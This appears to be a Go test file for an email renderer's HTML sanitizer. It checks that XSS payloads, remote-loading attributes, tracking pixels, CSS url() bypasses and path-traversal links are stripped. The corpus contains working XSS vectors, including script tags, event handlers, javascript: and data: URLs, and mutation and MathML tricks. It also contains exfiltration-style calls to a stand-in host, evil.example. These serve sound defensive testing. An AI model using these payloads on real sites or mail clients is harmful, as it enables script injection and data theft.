package render_test

import (
	"strings"
	"testing"
	"time"

	"github.com/AutumnsGrove/Ivy/mime"
	"github.com/AutumnsGrove/Ivy/render"
	"golang.org/x/net/html"
)

// xssCorpus is the known-hostile input set (TESTING.md 3): every case must come
// out of the sanitizer with none of its dangerous markers intact.
var xssCorpus = []struct {
	name   string
	html   string
	forbid []string
}{
	{
		name:   "script tag",
		html:   `<p>hi</p><script>alert(1)</script>`,
		forbid: []string{"<script", "alert(1)"},
	},
	{
		name:   "broken script tag",
		html:   `<scr<script>ipt>alert(1)</script>`,
		forbid: []string{"<script"},
	},
	{
		name:   "img onerror",
		html:   `<img src=x onerror="alert(1)">`,
		forbid: []string{"onerror", "alert(1)"},
	},
	{
		name:   "svg onload",
		html:   `<svg onload="alert(1)"><circle r="1"/></svg>`,
		forbid: []string{"onload", "alert(1)", "<svg"},
	},
	{
		name:   "body onload",
		html:   `<body onload="alert(1)">x</body>`,
		forbid: []string{"onload", "alert(1)"},
	},
	{
		name:   "javascript href",
		html:   `<a href="javascript:alert(1)">click</a>`,
		forbid: []string{"javascript:", "alert(1)"},
	},
	{
		name:   "mixed case javascript href",
		html:   `<a href="JaVaScRiPt:alert(1)">click</a>`,
		forbid: []string{"javascript", "script:", "alert(1)"},
	},
	{
		name:   "newline in javascript href",
		html:   "<a href=\"java\nscript:alert(1)\">click</a>",
		forbid: []string{"script:", "alert(1)"},
	},
	{
		name:   "tab in javascript href",
		html:   "<a href=\"java\tscript:alert(1)\">click</a>",
		forbid: []string{"script:", "alert(1)"},
	},
	{
		name:   "data image",
		html:   `<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`,
		forbid: []string{"<script", "data:text/html"},
	},
	{
		name:   "iframe",
		html:   `<iframe src="https://evil.example/x"></iframe>`,
		forbid: []string{"<iframe", "evil.example"},
	},
	{
		name:   "object and embed",
		html:   `<object data="https://evil.example/x"></object><embed src="https://evil.example/y">`,
		forbid: []string{"<object", "<embed", "evil.example"},
	},
	{
		name:   "form and input",
		html:   `<form action="https://evil.example/steal"><input name="q" value="x"></form>`,
		forbid: []string{"<form", "<input", "evil.example"},
	},
	{
		name:   "base tag",
		html:   `<base href="https://evil.example/"><a href="/x">x</a>`,
		forbid: []string{"<base", "evil.example"},
	},
	{
		name:   "meta refresh",
		html:   `<meta http-equiv="refresh" content="0;url=https://evil.example/">`,
		forbid: []string{"<meta", "evil.example"},
	},
	{
		name:   "stylesheet link",
		html:   `<link rel="stylesheet" href="https://evil.example/x.css">`,
		forbid: []string{"<link", "evil.example"},
	},
	{
		name:   "style element exfiltration",
		html:   `<style>@import url("https://evil.example/x.css");</style><p>hi</p>`,
		forbid: []string{"<style", "@import", "evil.example"},
	},
	{
		name:   "style attribute url",
		html:   `<div style="background:url('https://evil.example/beacon')">x</div>`,
		forbid: []string{"background", "evil.example"},
	},
	{
		name:   "style attribute expression",
		html:   `<div style="width:expression(alert(1))">x</div>`,
		forbid: []string{"expression", "alert(1)"},
	},
	{
		name:   "mutation xss",
		html:   `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
		forbid: []string{"onerror", "alert(1)"},
	},
	{
		name:   "srcset remote",
		html:   `<img srcset="https://evil.example/a.png 1x, https://evil.example/b.png 2x" src="cid:a@b">`,
		forbid: []string{"evil.example", "srcset"},
	},
	{
		name:   "background attribute",
		html:   `<table background="https://evil.example/x.png"><tr><td>x</td></tr></table>`,
		forbid: []string{"evil.example", "background"},
	},
	{
		name:   "video poster onerror",
		html:   `<video poster="x" onerror="alert(1)"><source src="https://evil.example/v" onerror="alert(2)"></video>`,
		forbid: []string{"onerror", "alert(1)", "evil.example"},
	},
	{
		name:   "mathml",
		html:   `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>`,
		forbid: []string{"onerror", "alert(1)", "<style", "<math"},
	},
}

func TestSanitizerStripsCorpus(t *testing.T) {
	t.Parallel()
	for _, tc := range xssCorpus {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got := render.SanitizeHTML(tc.html, render.Options{MessageID: "m1"})
			low := strings.ToLower(got)
			for _, bad := range tc.forbid {
				if strings.Contains(low, strings.ToLower(bad)) {
					t.Errorf("sanitized output kept %q:\n%s", bad, got)
				}
			}
		})
	}
}

func TestRemoteImagesBlockedByDefault(t *testing.T) {
	t.Parallel()
	got := render.SanitizeHTML(
		`<p>x</p><img src="https://cdn.example/photo.png" alt="photo">`,
		render.Options{MessageID: "m1"},
	)
	if strings.Contains(got, "cdn.example") {
		t.Errorf("remote image URL survived the default policy:\n%s", got)
	}
	if !strings.Contains(got, "photo") && !strings.Contains(got, "x") {
		t.Errorf("sanitizer dropped the message content too:\n%s", got)
	}
}

func TestRemoteImagesAllowedForAllowListedSender(t *testing.T) {
	t.Parallel()
	got := render.SanitizeHTML(
		`<img src="https://cdn.example/photo.png" alt="photo">`,
		render.Options{MessageID: "m1", AllowRemoteImages: true},
	)
	if !strings.Contains(got, "https://cdn.example/photo.png") {
		t.Errorf("allow-listed remote image was blocked:\n%s", got)
	}
}

func TestTrackingPixelsStrippedEvenWhenRemoteAllowed(t *testing.T) {
	t.Parallel()
	got := render.SanitizeHTML(
		`<img src="https://t.example/o.gif" width="1" height="1">`+
			`<img src="https://cdn.example/pixel.gif" width="0" height="0">`+
			`<img src="https://cdn.example/photo.png" width="600" height="400" alt="real">`,
		render.Options{MessageID: "m1", AllowRemoteImages: true},
	)
	if strings.Contains(got, "t.example") {
		t.Errorf("1x1 tracking pixel survived:\n%s", got)
	}
	if strings.Contains(got, "pixel.gif") {
		t.Errorf("named tracking pixel survived:\n%s", got)
	}
	if !strings.Contains(got, "photo.png") {
		t.Errorf("real image was removed along with the trackers:\n%s", got)
	}
}

func TestCIDRewrittenToInlineURL(t *testing.T) {
	t.Parallel()
	got := render.SanitizeHTML(
		`<img src="cid:logo@example.com" alt="logo">`,
		render.Options{MessageID: "msg-1"},
	)
	if !strings.Contains(got, "/api/v1/messages/msg-1/inline/") {
		t.Errorf("cid: was not rewritten to a local inline URL:\n%s", got)
	}
	if strings.Contains(got, "cid:") {
		t.Errorf("raw cid: scheme survived:\n%s", got)
	}
}

func TestBodyPlainTextFallback(t *testing.T) {
	t.Parallel()
	res := render.Body(mime.Parsed{
		HTML: "<p>Hello <b>world</b> &amp; goodbye</p>",
	}, render.Options{MessageID: "m1"})
	if !strings.Contains(res.HTML, "<b>world</b>") {
		t.Errorf("HTML body not sanitized/kept:\n%s", res.HTML)
	}
	if got := strings.TrimSpace(res.Text); got != "Hello world & goodbye" {
		t.Errorf("plain-text fallback = %q, want %q", got, "Hello world & goodbye")
	}
}

func TestBodyPrefersTheMessageText(t *testing.T) {
	t.Parallel()
	res := render.Body(mime.Parsed{
		HTML: "<p>html version</p>",
		Text: "text version",
	}, render.Options{MessageID: "m1"})
	if strings.TrimSpace(res.Text) != "text version" {
		t.Errorf("Text = %q, want the message's own text part", res.Text)
	}
}

func TestBodyWithoutHTML(t *testing.T) {
	t.Parallel()
	res := render.Body(mime.Parsed{Text: "only text"}, render.Options{MessageID: "m1"})
	if res.HTML != "" {
		t.Errorf("HTML = %q, want empty for a text-only message", res.HTML)
	}
	if strings.TrimSpace(res.Text) != "only text" {
		t.Errorf("Text = %q, want the message text", res.Text)
	}
}

func TestSanitizeIsIdempotent(t *testing.T) {
	t.Parallel()
	for _, tc := range xssCorpus {
		once := render.SanitizeHTML(tc.html, render.Options{MessageID: "m1"})
		twice := render.SanitizeHTML(once, render.Options{MessageID: "m1"})
		if once != twice {
			t.Errorf("%s: sanitizing twice changed the output\nonce:  %s\ntwice: %s", tc.name, once, twice)
		}
	}
}

func TestSanitizeHugeHTMLFallsBackToText(t *testing.T) {
	t.Parallel()
	huge := "<p>" + strings.Repeat("a", render.MaxHTMLBytes+1) + "</p>"
	res := render.Body(mime.Parsed{HTML: huge}, render.Options{MessageID: "m1"})
	if res.HTML != "" {
		t.Errorf("HTML = %d bytes, want empty above the cap", len(res.HTML))
	}
	if res.Text == "" {
		t.Errorf("Text is empty; the fallback must say why")
	}
}

func TestContentSecurityPolicy(t *testing.T) {
	t.Parallel()
	blocked := render.ContentSecurityPolicy(render.Options{})
	if !strings.Contains(blocked, "default-src 'none'") {
		t.Errorf("policy allows something by default:\n%s", blocked)
	}
	if !strings.Contains(blocked, "img-src 'self'") || strings.Contains(blocked, "https:") {
		t.Errorf("default policy should load only inline images:\n%s", blocked)
	}
	if strings.Contains(blocked, "unsafe-eval") || strings.Contains(blocked, "script-src") {
		t.Errorf("policy must not enable scripts:\n%s", blocked)
	}

	allowed := render.ContentSecurityPolicy(render.Options{AllowRemoteImages: true})
	if !strings.Contains(allowed, "img-src 'self' https:") {
		t.Errorf("allow-listed policy should permit https images:\n%s", allowed)
	}
	if strings.Contains(allowed, "http:") {
		t.Errorf("allow-listed policy should not permit plaintext images:\n%s", allowed)
	}
}

func FuzzSanitize(f *testing.F) {
	for _, s := range []string{
		"<p>hi</p>",
		`<a href="javascript:alert(1)">x</a>`,
		`<img src=x onerror=alert(1)>`,
		`<img src="https://evil.example/x">`,
		`<div style="background:url(https://evil.example)">x</div>`,
		`<svg><script>alert(1)</script></svg>`,
		`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
		`<img src="cid:a@b">`,
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, html string) {
		start := time.Now()
		got := render.SanitizeHTML(html, render.Options{MessageID: "m1"})
		// The sanitizer runs on the sync path for every HTML message, so a slow
		// input is a defect (STANDARDS.md 4a).
		if elapsed := time.Since(start); elapsed > 2*time.Second {
			t.Fatalf("sanitizing %d bytes took %s", len(html), elapsed)
		}
		low := strings.ToLower(got)
		for _, bad := range []string{"<script", "<iframe", "<object", "<embed", "<form", "<base", "<meta", "<link", "<style"} {
			if strings.Contains(low, bad) {
				t.Fatalf("sanitized output kept %q from %q:\n%s", bad, html, got)
			}
		}
		assertNoLiveMarkup(t, got, html)
	})
}

// assertNoLiveMarkup walks the sanitized output and fails on any attribute that
// could execute or fetch: event handlers, javascript:/data: URLs, CSS url() and
// the attributes that load remote resources behind our back.
func assertNoLiveMarkup(t *testing.T, got, from string) {
	t.Helper()
	z := html.NewTokenizer(strings.NewReader(got))
	for {
		tt := z.Next()
		if tt == html.ErrorToken {
			return
		}
		if tt != html.StartTagToken && tt != html.SelfClosingTagToken {
			continue
		}
		tok := z.Token()
		for _, a := range tok.Attr {
			key := strings.ToLower(a.Key)
			val := strings.ToLower(strings.TrimSpace(a.Val))
			switch {
			case strings.HasPrefix(key, "on"):
				t.Fatalf("event handler %q survived from %q:\n%s", a.Key, from, got)
			case key == "srcset", key == "background":
				t.Fatalf("loading attribute %q survived from %q:\n%s", a.Key, from, got)
			case strings.HasPrefix(val, "javascript:"), strings.HasPrefix(val, "vbscript:"), strings.HasPrefix(val, "data:"):
				t.Fatalf("dangerous URL %q survived from %q:\n%s", a.Val, from, got)
			case key == "style" && (strings.Contains(val, "url(") || strings.Contains(val, "expression(")):
				t.Fatalf("style %q survived from %q:\n%s", a.Val, from, got)
			}
		}
	}
}

// A style value that fetches a URL would bypass both the remote-image block and
// the tracking-pixel strip, so none may survive (list-style and font accept url()).
func TestStyleValuesNeverFetch(t *testing.T) {
	t.Parallel()
	for _, style := range []string{
		"list-style:url(https://t.example/b.gif)",
		"list-style: URL( 'https://t.example/b.gif' ) inside",
		"list-style-type:disc;list-style:url(//t.example/b.gif)",
		"font:12px url(https://t.example/b.woff)",
		`list-style:\75rl(https://t.example/b.gif)`,
		`list-style-type:disc;list-style:u\rl(https://t.example/b.gif)`,
		"border:1px solid red;color:image-set('https://t.example/b.gif' 1x)",
	} {
		got := render.SanitizeHTML(
			`<ul style="`+style+`"><li>x</li></ul>`,
			render.Options{MessageID: "m1", AllowRemoteImages: true},
		)
		if strings.Contains(got, "t.example") {
			t.Errorf("style %q kept a fetchable URL:\n%s", style, got)
		}
	}
}

// The renderer's own inline URLs must stay confined to one segment under the
// message's inline path; a sender-written ../ would otherwise reach any other
// same-origin URL (the invariant stated in newBasePolicy).
func TestSenderWrittenInlineURLCannotClimbOut(t *testing.T) {
	t.Parallel()
	for _, href := range []string{
		"/api/v1/messages/m1/inline/../../m2/attachments/0",
		"/api/v1/messages/m1/inline/%2e%2e/%2e%2e/accounts",
		"/api/v1/messages/m1/inline/a/b",
		"/api/v1/messages/m1/inline/..",
	} {
		got := render.SanitizeHTML(
			`<a href="`+href+`">l</a><img src="`+href+`">`,
			render.Options{MessageID: "m1"},
		)
		if strings.Contains(got, "/api/") {
			t.Errorf("sender URL %q survived:\n%s", href, got)
		}
	}
}
